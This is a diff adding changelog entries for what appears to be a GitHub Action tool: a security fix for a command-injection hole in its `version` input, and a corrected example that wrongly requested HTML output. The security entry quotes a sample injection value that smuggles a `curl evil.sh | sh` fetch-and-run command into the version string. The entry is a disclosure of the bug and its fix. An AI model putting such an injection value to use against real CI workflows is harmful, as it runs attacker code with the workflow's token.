@@ -4,6 +4,14 @@ Conventional Commits format. All notable changes documented here.
 
 ## [Unreleased]
 
+### Security
+
+- **The Action's `version` input can no longer reach a shell.** Inputs were routed through the environment so a crafted value could not break out of the script it was read in — but `version` also becomes a step output, and the install step consumed that output with `${{ }}`, which splices into the script text at render time. A value like `v1.0"; curl evil.sh | sh; "` therefore executed in the job with the workflow's token, one hop past the protection, while the file's comments asserted the surface was closed. The resolve step now rejects anything that is not a `vX.Y.Z` tag before writing the output, and the install step reads its step outputs through the environment as well — two independent barriers. CI gained a step that passes a crafted version and fails the build unless it is rejected *and* no command ran; the existing Action smoke test only ever exercised the happy path, which is how the gap shipped.
+
+### Fixed
+
+- **The "Health over time" Action example now runs.** It requested `format: html` for `health-trend` and `architecture-trend`; neither has an HTML emitter, so both steps exited 2 and the artifact upload collected files that were never written — the documented happy path for the tool's headline job, broken on first use. Both now use `markdown`, with a note that `csv` is the machine-readable choice and that HTML is unavailable for these two. Every command in the README's matching walkthrough was re-run and verified to exit 0.
+
 ## [0.27.0] - 2026-08-06
 
 ### Added
